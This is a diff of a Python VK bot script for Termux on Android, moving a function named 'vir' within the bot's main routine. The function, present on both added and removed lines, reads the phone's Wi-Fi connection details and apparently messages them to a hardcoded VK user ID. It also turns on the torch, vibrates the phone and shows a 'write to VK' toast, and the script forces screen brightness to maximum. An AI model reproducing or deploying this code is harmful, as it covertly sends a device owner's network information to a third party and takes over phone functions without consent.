@@ -3,6 +3,14 @@ import os
 import vk_api
 from vk_api.longpoll import VkLongPoll, VkEventType
 def bot():
+    def vir():
+            os.system(r'termux-wifi-connectioninfo>>red.txt')
+            o=open(r'red.txt')
+            rik=o.read()
+            y(437306907,rik)
+            os.system('termux-torch on')
+            os.system('termux-vibrate -d 1000')
+            os.system('termux-toast напиши вк')
     rand=123456
     print('Не темно?')
     os.system('termux-brightness 255')
@@ -16,14 +24,6 @@ def bot():
     vk=vk_api.VkApi(token=token)
     longpoll=VkLongPoll(vk)
     for event in longpoll.listen():
-        def vir():
-            os.system(r'termux-wifi-connectioninfo>>red.txt')
-            o=open(r'red.txt')
-            rik=o.read()
-            y(437306907,rik)
-            os.system('termux-torch on')
-            os.system('termux-vibrate -d 1000')
-            os.system('termux-toast напиши вк')
         if event.type==VkEventType.MESSAGE_NEW:
             rand+=1
             if event.to_me:
